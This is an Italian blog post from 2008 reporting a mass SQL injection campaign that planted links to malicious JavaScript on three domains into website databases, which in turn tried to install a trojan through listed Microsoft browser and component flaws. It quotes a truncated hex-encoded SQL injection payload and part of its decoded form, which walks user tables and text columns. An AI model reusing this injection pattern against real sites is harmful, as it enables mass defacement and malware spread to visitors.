---
layout: post
title: 'SQL Injection di massa: nmidahena.com, aspder.com e nihaorr1.com'
date: '2008-04-24T22:05:00.001+02:00'
author: Andrea Fortuna
tags:
- Sicurezza
- SQL Injection
- Infection
- IIS
- security
modified_time: '2012-04-26T14:20:43.911+02:00'
blogger_id: tag:blogger.com,1999:blog-1948348952555789070.post-6444810694186124362
blogger_orig_url: http://www.andreafortuna.org/2008/04/sql-injection-di-massa-nmidahenacom_24.html
---

Interessante questa <a href="http://www.f-secure.com/weblog/archives/00001427.html">notizia</a> presente sul sito di F-Secure: sarebbe in atto un 'attacco' che, sfruttando la SQL Injection, altera i campi di testo dei database di backend dei siti web vulnerabili 'inettando' codice html necessario al caricamente di un codice javascript 'malevolo'.<br/><br/>La stima di F-Secure realizzata cercando su Google la stringa 'iniettata' è di circa 510.000 pagine 'infettate' e effettivamente, riproducendo la <a href="http://www.google.com/search?hl=it&amp;client=safari&amp;rls=it-it&amp;q=%22%3Cscript+src%3Dhttp%3A%2F%2F%22%2B%221.js%22&amp;btnG=Cerca&amp;lr=">query</a> di ricerca il risultato si attesta sulle 502.000 pagine.<br/><br/>Come avviene l'infezione? Continuo a citare:<br/><blockquote>Unless that data is sanitized before it gets saved you can't control what the website will show to the users. This is what SQL injection is all about, exploiting weaknesses in these controls. In this case the injection code starts off like this (note, this is not the complete code):<br/><br/>DECLARE%20@S%20NVARCHAR(4000);SET%20@S=CAST(0x440045004300<br/>4C00410052004500200040005400200076006100720063006800610072<br/>00280032003500350029002C0040004300200076006100720063006800<br/>610072002800320035003500290020004400450043004C004100520045<br/>0020005400610062006C0065005F0043007500720073006F0072002000<br/>43005500520053004F005200200046004F0052002000730065006C0065<br/>0063007400200061002E006E0061006D0065002C0062002E006E006100<br/>6D0065002000660072006F006D0020007300790073006F0062006A0065<br/>00630074007300200061002C0073007900730063006F006C0075006D00<br/>6E00730020006200200077006800650072006500200061002E00690064<br/>003D0062002E0069006400200061006E006400200061002E0078007400<br/>7900700065003D00270075002700200061006E0064002000280062002E<br/>00780074007900700065003D003900390020006F007200200062002E00<br/>780074007900700065003D003300350020006…<br/><br/>Which when decoded becomes:<br/><br/>DECLARE @T varchar(255)'@C varchar(255) DECLARE Table_Cursor<br/>CURSOR FOR select a.name'b.name from sysobjects a'syscolumns b<br/>where a.id=b.id and a.xtype='u' and (b.xtype=99 or b.xtype=35<br/>or b…</blockquote><br/>Il codice SQL eseguito comporterebbe appunto la modifica di tutti i campi di testo del database (solitamente utilizzati per archiviare i contenuti del sito) ai quali viene aggiunto un link a un file javascript  hostato su 3 diversi domini (nmidahena.com, aspder.com and nihaorr1.com, attualmente non raggiungibili)<br/><br/>Lo script avvia il caricamento dei file necessari ad utilizzare differenti exploit con lo scopo di installare un trojan sui client che incappano nel sito infetto.<br/><br/>Da <a href="http://pandalabs.pandasecurity.com/archive/IFRAMES-Attack-_210021002100_.aspx">PandaLabs</a> cito l'elenco di vulnerabilità che il codice malevolo cerca di utilizzare per l'installazione del trojan:<br/><blockquote><a href="http://www.microsoft.com/technet/security/Bulletin/MS06-014.mspx">MS06-014</a> Vulnerability in the Microsoft Data Access Components (MDAC) Function Could Allow Code Execution<br/><br/><a href="http://www.microsoft.com/technet/security/Bulletin/MS07-004.mspx">MS07-004</a> Vulnerability in Vector Markup Language Could Allow Remote Code Execution<br/><br/><a href="http://www.microsoft.com/technet/security/Bulletin/MS07-018.mspx">MS07-018</a> Vulnerabilities in Microsoft Content Management Server Could Allow Remote Code Execution<br/><br/><a href="http://www.microsoft.com/technet/security/Bulletin/MS07-033.mspx">MS07-033</a> Cumulative Security Update for Internet Explorer<br/><br/><a href="http://www.microsoft.com/technet/security/Bulletin/MS07-055.mspx">MS07-055</a> Vulnerability in kodak Image Viewer Could Allow Remote Code Execution</blockquote><br/>[via <a href="http://www.f-secure.com/weblog/archives/00001427.html">F-Secure</a>]